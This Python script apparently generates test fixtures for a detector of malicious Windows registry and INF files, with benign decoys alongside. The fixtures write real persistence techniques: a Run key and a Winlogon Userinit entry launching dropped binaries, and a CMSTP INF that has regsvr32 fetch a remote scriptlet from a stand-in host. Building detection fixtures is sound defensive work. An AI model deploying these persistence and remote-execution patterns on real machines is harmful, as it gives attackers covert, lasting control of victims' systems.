# stdlib-only writer of the reg/inf fixtures (independent of lib/codec.py)
import base64, gzip, sys, pathlib
out = pathlib.Path(sys.argv[1])
def comma_hex(b, prefix):
    # regedit layout: comma-separated bytes, wrapped at ~80 cols with ",\" + two-space indent
    parts, line, lines = [f"{x:02x}" for x in b], prefix, []
    for i, p in enumerate(parts):
        tok = p + ("," if i < len(parts) - 1 else "")
        if len(line) + len(tok) > 77:
            lines.append(line + "\\"); line = "  "
        line += tok
    lines.append(line)
    return "\r\n".join(lines)
def u16(s): return s.encode("utf-16-le")
def write_reg(name, body):
    (out / name).write_bytes(b"\xff\xfe" + body.replace("\n", "\r\n").replace("\r\r\n", "\r\n").encode("utf-16-le"))

P1 = "v=3|language=reg|role=persistence|verdict=malicious|attack=T1547.001|adapter=run_key_expand|stage_count=2|steps=write_expand_sz,launch_on_logon|campaign_id=REG-c0de7701|url=https://reg-c0de7701.example.invalid/k"
mat = base64.b64encode(gzip.compress(P1.encode(), mtime=0)).decode()
write_reg("reg_hex2_continuation.reg",
  "Windows Registry Editor Version 5.00\n\n"
  "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"
  + comma_hex(u16("%SystemRoot%\\System32\\rundll32.exe %APPDATA%\\cfg.dll,Start\0"), '"CfgSync"=hex(2):') + "\n\n"
  "[HKEY_CURRENT_USER\\Software\\Classes\\cfgsync]\n"
  + comma_hex(u16(mat + "\0"), '"descriptor_c0de7701"=hex(2):') + "\n\n")

P2 = "v=3|language=reg|role=persistence|verdict=malicious|attack=T1547.004|adapter=winlogon_multisz|stage_count=2|steps=append_userinit,launch_on_logon|campaign_id=REG-7a11c0de|url=https://reg-7a11c0de.example.invalid/m"
marker = "HUNTRESS_ANALYSIS_V1:HEX-" + P2.encode().hex()
write_reg("reg_hex7_multisz.reg",
  "Windows Registry Editor Version 5.00\n\n"
  "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\n"
  + comma_hex(u16("C:\\Windows\\system32\\userinit.exe,\0C:\\ProgramData\\upd.exe\0" + marker + "\0\0"), '"Userinit"=hex(7):') + "\n\n")

D = base64.b64encode(b"just a benign multi-line configuration note, nothing executable here at all").decode()
write_reg("reg_decoy_benign_hex.reg",
  "Windows Registry Editor Version 5.00\n\n"
  "[HKEY_CURRENT_USER\\Environment]\n"
  + comma_hex(u16("%USERPROFILE%\\AppData\\Local\\Temp\0"), '"TEMP"=hex(2):') + "\n"
  + comma_hex(u16("one\0two\0three\0\0"), '"List"=hex(7):') + "\n"
  + comma_hex(u16(D + "\0"), '"descriptor_decoy01"=hex(2):') + "\n\n")

P3 = "v=3|language=inf|role=proxy_execution|verdict=malicious|attack=T1218.003|adapter=cmstp_inf|stage_count=3|steps=run_presetup,unregister_ocx,write_run_key|campaign_id=INF-0a1b2c3d|url=https://inf-0a1b2c3d.example.invalid/s"
m3 = base64.b64encode(P3.encode()).decode()
h = len(m3) // 2
inf = (
  "; cmstp profile\n[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n"
  "[DefaultInstall_SingleUser]\nUnRegisterOCXs=UnRegisterOCXSection\nRunPreSetupCommands=RunPreSetupCommandsSection\n"
  "AddReg=CfgReg\n\n"
  "[RunPreSetupCommandsSection]\n%TOOL% /s /n /u /i:%URL% %DLL%\ntaskkill /IM cmstp.exe /F\n\n"
  "[UnRegisterOCXSection]\n%11%\\%DLL%,NI,%URL%\n\n"
  "[CfgReg]\nHKCU,\"%CFGKEY%\",\"%DNAME%\",0x00000000,\"%DPART1%%DPART2%\"\n\n"
  "[Strings]\nAppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\nServiceName=\"VPN\"\nShortSvcName=\"VPN\"\n"
  "TOOL=\"regsvr32.exe\"\nDLL=\"scrobj.dll\"\nURL=\"https://inf-0a1b2c3d.example.invalid/s.sct\"\n"
  "CFGKEY=\"Software\\CfgSync\"\nDNAME=\"descriptor_0a1b2c3d\"\n"
  f"DPART1=\"{m3[:h]}\"\nDPART2=\"{m3[h:]}\"\n")
(out / "inf_strings_subst.inf").write_bytes(inf.replace("\n", "\r\n").encode())

inf_d = (
  "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall_SingleUser]\nRunPreSetupCommands=Pre\nAddReg=R\n\n"
  "[Pre]\n%TOOL% /?\n\n[R]\nHKCU,\"%K%\",\"%N%\",0,\"%V1%%V2%\"\n\n"
  "[Strings]\nTOOL=\"notepad.exe\"\nK=\"Software\\Demo\"\nN=\"descriptor_dec0y02\"\n"
  f"V1=\"{D[:20]}\"\nV2=\"{D[20:]}\"\n")
(out / "inf_decoy_noplan.inf").write_bytes(inf_d.replace("\n", "\r\n").encode())
